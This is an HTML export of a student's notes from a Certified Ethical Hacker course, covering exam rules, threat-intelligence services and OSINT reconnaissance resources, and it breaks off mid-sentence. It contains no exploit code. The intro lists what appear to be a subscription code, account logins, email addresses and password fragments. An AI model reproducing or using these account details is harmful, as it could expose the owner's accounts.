<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Certified Ethical Hacker Training - AKTINA</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="30361f2b-cdfd-4669-b696-0d19bbb4da89" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/images_(1).png"/></div><h1 class="page-title">Certified Ethical Hacker Training - AKTINA</h1><p class="page-description"></p></header><div class="page-body"><figure id="135bdadd-c4a7-8073-8dc8-c84d102e17bb" class="link-to-page"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH%20Practical%20Exam%20Material%20135bdaddc4a780738dc8c84d102e17bb.html">CEH Practical Exam Material</a></figure><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 1 - Introduction and Finding Info</summary><div class="indented"><ul id="cb1b7de2-ff7b-461c-9205-5a5e7e5ae94e" class="toggle"><li><details open=""><summary>Recording</summary><figure id="b64d027e-9bab-45d5-b0df-6021ad2d8777"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_Day_1_-_Modules_1_2.txt">CEH Day 1 - Modules 1, 2.txt</a></div></figure></details></li></ul><ul id="7f5b32a6-d183-421d-9599-95ed6cca3e9e" class="toggle"><li><details open=""><summary>Intro</summary><ul id="d5c7ffc1-7fc9-43fb-870d-37962e4f44ec" class="bulleted-list"><li style="list-style-type:disc">Sub Code: SLPXCEHA5sM49vF6pzcCqh</li></ul><ul id="154a9437-6065-4413-91b4-75c1fefba83e" class="bulleted-list"><li style="list-style-type:disc">krinosvasileiou 9K%</li></ul><ul id="01e0d3fd-b6c5-4305-803c-f26ba3d6e209" class="bulleted-list"><li style="list-style-type:disc"><a href="https://aspen.eccouncil.org/Account/Login">https://aspen.eccouncil.org/Account/Login</a></li></ul><ul id="5e77f560-728b-4679-9a6a-a4dd560efbbc" class="bulleted-list"><li style="list-style-type:disc"><a href="https://eccouncil.learnondemand.net/">https://eccouncil.learnondemand.net/</a> krinosvasileiou@h 9K%</li></ul><ul id="39714f67-0e98-4639-8736-47eeb835ddf8" class="bulleted-list"><li style="list-style-type:disc">vitalsource<ul id="7dffd9ef-5818-41cc-9bb9-04b220caafed" class="bulleted-list"><li style="list-style-type:circle">ck@g 9K%</li></ul></li></ul><ul id="1011f617-a99e-45d8-8705-d9cf18e7e84e" class="bulleted-list"><li style="list-style-type:disc">Mane Piperevski from North Macedonia mane@piperevski.com</li></ul><ul id="d82469c5-ea82-42a7-9630-65f9e6edace7" class="bulleted-list"><li style="list-style-type:disc">exam is tricky, might change a little bit a question</li></ul><p id="812e4b2f-f1dc-4460-8c51-2130a55f954a" class="">
</p><p id="3d658d8f-05e4-45ca-89ad-4a483040d13d" class="">
</p><ul id="ab76fab6-1363-495f-b0f7-1d61ddcaba47" class="bulleted-list"><li style="list-style-type:disc">We can downlaod the books or vitalsource</li></ul><ul id="ac5395c5-206d-4ec3-85dd-78cf58395467" class="bulleted-list"><li style="list-style-type:disc">We have <strong>two exams</strong>, the practical and the multiple choice<ul id="b70e6f45-29a6-42d7-a6da-3d2a941d227a" class="bulleted-list"><li style="list-style-type:circle"><strong>Theoretical:</strong><ul id="4ef96ea7-1e64-48a3-acef-24eaf5c9aa06" class="bulleted-list"><li style="list-style-type:square">Unlimited retakes no pay for 12 months from the day the voucher code of the exam is generated</li></ul><ul id="e3498c53-bf71-4498-a3a7-d9b36f4de6b3" class="bulleted-list"><li style="list-style-type:square">125 questions, 4 hours</li></ul><ul id="c203c920-9c7b-40e4-b762-ac40673506a5" class="bulleted-list"><li style="list-style-type:square">To pass, we need 75% for each topic not for the general number of questions</li></ul></li></ul><ul id="9256b300-a1d5-42fa-886d-cb989ba3d53e" class="bulleted-list"><li style="list-style-type:circle"><strong>Practical:</strong> <ul id="0ac71b20-b1a6-4fff-a267-4dbb7d6e8952" class="bulleted-list"><li style="list-style-type:square">14/20 questions to pass</li></ul><ul id="a53ea7f7-fbef-446c-8cd2-99dd38f43349" class="bulleted-list"><li style="list-style-type:square">only available for 6 months through cyber Q</li></ul><ul id="47d1ce79-63de-4b2f-8150-753736935985" class="bulleted-list"><li style="list-style-type:square">6 hours</li></ul><ul id="04c61e98-4933-4681-9aa5-7f687e8d55c4" class="bulleted-list"><li style="list-style-type:square">rev eng, buffer overflow, hidden malware extract url for coc server etc</li></ul><ul id="de5a08dc-e381-42f1-b018-5c01989b63c0" class="bulleted-list"><li style="list-style-type:square">but only one attempt no unlimited retakes</li></ul></li></ul><ul id="0c0e420c-8c9a-4341-85ab-240626c4bee3" class="bulleted-list"><li style="list-style-type:circle"><strong>CEH Engage:</strong><ul id="adb29aa5-1f7f-4ba6-b1be-474113c167d2" class="bulleted-list"><li style="list-style-type:square">Online platform that simulates the practical exam</li></ul></li></ul><ul id="e63e7ce8-e63e-46b4-88db-5988f84d10e1" class="bulleted-list"><li style="list-style-type:circle">Global CEH Challenges: CTF but no awards</li></ul></li></ul><ul id="3250598d-a8ea-4a89-85d4-f2777bc6feb5" class="bulleted-list"><li style="list-style-type:disc">Certificate is <strong>Valid for 3 years</strong>, during this year we need 120 education points with minimum 20 per year<ul id="0ace6ba8-b51b-4cc3-9707-99e940c5ac54" class="bulleted-list"><li style="list-style-type:circle">How to collect points:<ul id="844b4f7d-0cc0-4a45-be1a-2460348dfb7b" class="bulleted-list"><li style="list-style-type:square">Create event from other things you do in cybersecurity with proof that we continue the education</li></ul></li></ul><ul id="90438420-e584-4c9d-9c43-e08eb85e28d7" class="bulleted-list"><li style="list-style-type:circle">Yearly fee for certificate: 1 year included, 2nd year+ later 80 dollars per year<ul id="3882b4b8-ade0-46c7-89db-89ddf97c2d97" class="bulleted-list"><li style="list-style-type:square">To maintain the certificate and profile active</li></ul></li></ul></li></ul><ul id="20aa5dff-f7c4-461c-b785-250f0dd00b8d" class="bulleted-list"><li style="list-style-type:disc">Materials are available at aspen → <strong>Download Tools</strong></li></ul></details></li></ul><ul id="71def1e7-d3a7-4b6e-9dc9-86c9ff5e7fd4" class="toggle"><li><details open=""><summary>Module 01 - Intro </summary><ul id="ca39da25-9d59-4391-9ee6-5894002eb0ee" class="bulleted-list"><li style="list-style-type:disc">Georgians had viruses from russians that search speficic keywords<ul id="527d6dc7-00fb-4a30-9b0d-af893a55d669" class="bulleted-list"><li style="list-style-type:circle">to find that out they did and who they did, they created a pdf with reverse shell that includes specific keywords</li></ul><ul id="092cdcee-f298-4c41-b850-39df9a8fd0f5" class="bulleted-list"><li style="list-style-type:circle">They gaint remote control of russian computer and opened the cam to find who it was</li></ul><p id="14e34ea3-da8d-4b82-b261-7a75528a18ba" class="">
</p></li></ul><p id="119aaf52-a198-4c57-b665-ddeb16413e23" class="">LO#01: Explain Information Security Concepts<br/>LO#02: Explain Hacking Methodologies and Frameworks<br/>LO#03: Explain Hacking Concepts and Different Hacker Classes<br/>LO#04: Explain Ethical Hacking Concepts and Scope<br/>LO#05: Summarize the Techniques used in Information Security Controls<br/>LO#06: Explain the Importance of Applicable Security Laws and Stand<br/></p><p id="e34106c5-586e-4685-acfa-04759b548fdb" class="">
</p><p id="3af57bdf-cfae-40a1-8297-430ab08e9ea0" class="">Attacks = Motive (Goal) + Method + Vulnerability</p><ul id="cf9c28a7-6524-47fa-a8a1-0047288bb20d" class="bulleted-list"><li style="list-style-type:disc">all are needed as context to find what happened</li></ul><ul id="c76feba2-5e67-47d3-bb0f-f026eb716a8b" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="5c7129c2-e46c-4a9a-ad7d-34385f691813" class=""><div class="indented"><p id="ebeb79b1-eeaf-4bef-81f3-b5970e6b0878" class="">otx.<a href="http://alienvault.com">alienvault.com</a> is a free site for intelligence data on websites/ip addresses <div class="indented"><ul id="9216606e-9ad2-4d2b-90b3-58d33c138f76" class="bulleted-list"><li style="list-style-type:disc">used for finding sources that are attacking you</li></ul><ul id="125de11a-ff57-421a-b69f-620039820058" class="bulleted-list"><li style="list-style-type:disc">hacking groups that attacked the website</li></ul><ul id="8d709ac8-28a6-4850-8adc-7259d397d14c" class="bulleted-list"><li style="list-style-type:disc">information on the website</li></ul><ul id="03afc261-9143-4011-a8a3-7bb19c981fae" class="bulleted-list"><li style="list-style-type:disc">collects information from various sources called pulses (eg. ids, honeypots)<ul id="64199f16-18fa-41c9-952d-61c79173b0e8" class="bulleted-list"><li style="list-style-type:circle">if you have those, they can be connected there and share info</li></ul><ul id="bfbbca98-4e94-4859-9ad1-bc7ee704f974" class="bulleted-list"><li style="list-style-type:circle">they can give and provide info from these sources</li></ul></li></ul></div></p><p id="ea53cccf-1327-4609-ac4e-ad67b024e4fb" class=""><a href="http://misp-project.org">misp-project.org</a> is also a thread intelligence framweork<div class="indented"><ul id="ac11c552-5a74-4c5f-8cd3-69fedf6951d6" class="bulleted-list"><li style="list-style-type:disc">used for identifying sources that are attacking you</li></ul><ul id="e526f7aa-07d6-4998-933c-4d2703892742" class="bulleted-list"><li style="list-style-type:disc">but its not so organised, more messy info</li></ul><ul id="36ccb97d-25ef-40e3-8526-d6ff20384075" class="bulleted-list"><li style="list-style-type:disc">but it has biggest threat data on malware only</li></ul><p id="f2352315-a276-4559-966f-8a2f93dce6be" class="">
</p></div></p></div></p><ul id="60a2d104-d4a7-408c-a3e2-89ddd0251f45" class="bulleted-list"><li style="list-style-type:disc">Method: they might create a dns record and delete it so that theyr ip is not found<ul id="998d404f-0379-4121-b746-294576965fd8" class="bulleted-list"><li style="list-style-type:circle">but alienvault might record the first ip address which is the true one they first use to test</li></ul></li></ul><p id="ee3d5943-2e81-4160-b92a-fb752bf3c1ee" class="">
</p><ul id="6f65ea03-6d08-43da-bc59-980628bd9774" class="bulleted-list"><li style="list-style-type:disc">threadconnect.com<ul id="f3ef9315-63b2-4d34-a7d9-a0db7bf3b101" class="bulleted-list"><li style="list-style-type:circle">Used for all IT systems to automate defence</li></ul></li></ul><ul id="307f5a85-e7ee-4f15-87fe-1a131d469a8e" class="bulleted-list"><li style="list-style-type:disc">Microsoft Sentinel uses all thread intelligence sources for free<ul id="a969cfa6-dae5-446f-a005-a45afed67d9e" class="bulleted-list"><li style="list-style-type:circle">but you don’t get the information from misp and alienvalut, its more automated</li></ul><ul id="4fba8cff-354a-4f68-ab3b-65cbab69e556" class="bulleted-list"><li style="list-style-type:circle">but you all have the feeds of threadint for free</li></ul><p id="841c1648-2435-4ab7-8ee8-10f812f63f6a" class="">
</p></li></ul><ul id="b09e663e-084a-49a9-a8c0-a8098c14dae6" class="bulleted-list"><li style="list-style-type:disc"><strong>Incident Hanlding and Resposne Steps are important for the Exam</strong></li></ul><p id="414157e8-261c-4bc8-a313-d7ef9cf02ff9" class="">
</p><p id="d9f85694-93d4-4eaf-b707-6855c644f9d0" class="">
</p><ul id="8e183605-07d1-492e-8b37-68135a88c2b4" class="bulleted-list"><li style="list-style-type:disc">Immuni Web automates hacking methodology using AI<ul id="afdf1654-b516-434f-8826-1233a8ff9c29" class="bulleted-list"><li style="list-style-type:circle">hack and mobile app security tests</li></ul><ul id="6d37ea97-aefb-41da-9432-857b63b2d7a5" class="bulleted-list"><li style="list-style-type:circle">any web app or software</li></ul><ul id="32be5caf-03d7-4d39-824e-c120a3ee7850" class="bulleted-list"><li style="list-style-type:circle">freemium</li></ul><ul id="cac0d118-5749-4cb9-a119-1e349eda4447" class="bulleted-list"><li style="list-style-type:circle">has false positives, you need to verify existence of vulnerabulity</li></ul></li></ul></details></li></ul><ul id="79b514c7-1f66-45b0-81b4-bb430c948433" class="toggle"><li><details open=""><summary>Module 02 - Footprinting and Reconnaissance</summary><p id="4c99ef7c-b53a-4113-9c62-68dac7bf4bff" class="">Finding public info is not illegal, taking action on info is illegal</p><p id="e37588d1-2af7-4f97-937a-3a16a2a74b06" class="">But some IDS, even by clicking on the public info (eg not allowed link), might record you as malicious</p><p id="8ef666a3-c34a-491d-b346-9a8a41d1dba9" class="">
</p><ul id="fa943bef-5162-4007-8e3a-07b718b4d4db" class="bulleted-list"><li style="list-style-type:disc"><a href="http://ossintframework.com">ossintframework.com</a> <ul id="e8791fd3-2bce-41ff-aee2-d39d6a6aaa8a" class="bulleted-list"><li style="list-style-type:circle">Free framework for giving info on what we want to gather and how to do it</li></ul></li></ul><ul id="cf7e3fd3-cfa1-4e66-91f3-cbb55d6966e6" class="bulleted-list"><li style="list-style-type:disc"><a href="http://pgp.mit.edu">pgp.mit.edu</a> is his favourite<ul id="2394e3e4-5f0a-4f51-858a-cd6837852c1b" class="bulleted-list"><li style="list-style-type:circle">all public keys disclosed by users can be found and searched using a string</li></ul><ul id="d8322428-520b-4f6b-a28d-ea106123bcf9" class="bulleted-list"><li style="list-style-type:circle">you might find the username or other info of someone with this even though you search an email or sth else</li></ul></li></ul><ul id="14b629b3-da0d-44e0-a05c-d6627d531000" class="bulleted-list"><li style="list-style-type:disc">Google hacking database<ul id="84aae314-6a3a-4626-a2b5-85d562578d65" class="bulleted-list"><li style="list-style-type:circle">Johnny Long is the hacker behind it</li></ul><ul id="43edb611-6ddb-4961-8f46-5f78ee848a23" class="bulleted-list"><li style="list-style-type:circle">it has <strong>predefined google queries for finding useful hacking info </strong></li></ul><ul id="07f91b59-5d89-4482-8bb8-9452d6751535" class="bulleted-list"><li style="list-style-type:circle">you can find the data in exploit db</li></ul><ul id="58c840e3-d19b-4169-ac45-5b90ca5b445f" class="bulleted-list"><li style="list-style-type:circle">can find cameras, wordpress and other stuff</li></ul></li></ul><ul id="6012f6a4-878c-43d1-9284-ee0cc29500a6" class="bulleted-list"><li style="list-style-type:disc"><strong>Bug Bounty Course of HTB gives alot of info on hacking that no other course does and goes in depth to 